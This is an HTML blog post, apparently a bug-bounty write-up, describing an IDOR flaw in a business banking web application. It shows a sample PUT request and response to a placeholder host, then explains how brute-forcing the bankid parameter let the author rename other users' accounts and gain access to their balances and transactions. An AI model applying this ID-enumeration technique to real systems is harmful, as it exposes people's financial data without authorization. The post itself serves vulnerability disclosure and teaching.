@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Insecure Direct Object References (IDOR) Exploit Enables Unauthorized Access to Linked Bank Accounts — thevillagehacker</title>
+  <meta name="description" content="Insecure Direct Object References (IDOR) Exploit Enables Unauthorized Access to Linked Bank Accounts"/>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,300;0,400;0,500;0,600;1,400&family=Bebas+Neue&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="../assets/css/style.css"/>
+</head>
+<body>
+<div class="page">
+
+  <!-- Navigation -->
+  <nav>
+    <a class="nav-logo" href="../index.html">thevillagehacker</a>
+    <ul class="nav-links">
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../about.html">Whoami</a></li>
+      <li><a href="../changelog.html">Changelog</a></li>
+    </ul>
+  </nav>
+
+  <!-- Post Header -->
+  <div class="post-header">
+    <div class="breadcrumb">
+      <a href="../blog.html">Blog</a><span>→</span>Insecure Direct Object References (IDOR) Exploit Enables Unauthorized Access to Linked Bank Accounts
+    </div>
+    <h1 class="post-title">Insecure Direct Object References (IDOR) Exploit Enables Unauthorized Access to Linked Bank Accounts</h1>
+    <div class="post-meta">
+      <span>2022-10-10</span>
+      <span>Naveen Jagadeesan</span>
+      <span>thevillagehacker</span>
+    </div>
+  </div>
+
+  <!-- Article Body -->
+  <article>
+<p>Exploiting an Insecure Direct Object References (IDOR) vulnerability to gain control over other users' linked bank accounts.</p>
+<p><img src="../assets/images/blogs/IDOR/access-control.svg" alt="preview" /></p>
+<h2>Target Information</h2>
+<p>The target is a web application designed to facilitate invoice tracking, bill payment, and other transactions for organizations. It functions as a business banking application.</p>
+<h2>Reconnaissance</h2>
+<p>Upon examining the application's features, it was determined that the application is susceptible to an Insecure Direct Object References (IDOR) vulnerability. The vulnerability arises due to the application's reliance on user-provided input in the URL and JSON objects within the request body to perform actions on its APIs.</p>
+<h2>Exploitation</h2>
+<p>Several endpoints were exploited to gain unauthorized access to other organizations' users' invoices, transaction details, and bills.</p>
+<p>A noteworthy feature of the application allows users to link their bank accounts within the application. Upon merging accounts, the application generates a virtual bank account, such as the &quot;ABC Virtual Bank Account&quot; from &quot;ABC Internet Bank.&quot;</p>
+<p>To facilitate easy identification of bank account details, the application offers a feature allowing users to rename their accounts with nicknames. The following request demonstrates this functionality:</p>
+<h2>Request</h2>
+<pre><code class="language-http">PUT /connected_banking/12345 HTTP/2
+Host: www.target.com
+Cookie: blah...blah...blah...
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.target.com/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: iframe
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Te: trailers
+
+{
+	&quot;bankid&quot;: 12345,
+	&quot;account_nickname&quot;: &quot;thevillagehacker&quot;,
+	&quot;account_id&quot;: 1111,
+	&quot;company_id&quot;: 0000
+}
+</code></pre>
+<h2>Response</h2>
+<pre><code class="language-http">HTTP/1.1 200 OK 
+Access-Control-Allow-Origin: * 
+Content-Type: application/json; charset=utf-8 
+Set-Cookie: blah...blah...blah...; Path=/; HttpOnly 
+X-Frame-Options: SAMEORIGIN 
+X-Content-Type-Options: nosniff 
+X-XSS-Protection: 1; mode=block 
+Referrer-Policy: strict-origin-when-cross-origin 
+Connection: close 
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+{
+	&quot;abc_account_id&quot;: 12345,
+	&quot;account_nickname&quot;: &quot;thevillagehacker&quot;,
+	&quot;account_id&quot;: 1111,
+	&quot;company_id&quot;: 0000,
+	&quot;current_balance&quot;: 10000.00
+}
+</code></pre>
+<p>The above request illustrates that the application utilizes the bank ID from the URL and the JSON object in the request body. By brute-forcing the <code>bankid</code>, I was able to change the nicknames of other users' bank accounts.</p>
+<p>The IDOR vulnerability did not end there. Whenever I modified the nickname of users' bank accounts, those accounts became linked to my &quot;ABC Virtual Bank Account.&quot; Consequently, I gained access to the bank account details, balances, transactions, and other information of these users.</p>
+<p>Thank you for reading.</p>
+<p>Follow me on Twitter: <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p>
+
+  </article>
+
+  <!-- Post Navigation -->
+  <div class="post-nav">
+    <a href="2021-07-01-PII-Leak.html" class="post-nav-link prev"><div class="post-nav-dir">← Previous</div><div class="post-nav-title">API Security Misconfiguration Leads to tons of PII data Leakage</div></a>
+    <a href="2022-11-09-Insecure_Deserialization.html" class="post-nav-link next"><div class="post-nav-dir">Next →</div><div class="post-nav-title">Insecure Deserialization</div></a>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <span class="footer-text">
+      © 2025 <a href="../index.html">thevillagehacker</a>
+      — Naveen Jagadeesan
+    </span>
+    <span class="footer-text">
+      status: active<span class="blink"></span>
+    </span>
+  </footer>
+
+</div>
+</body>
+</html>
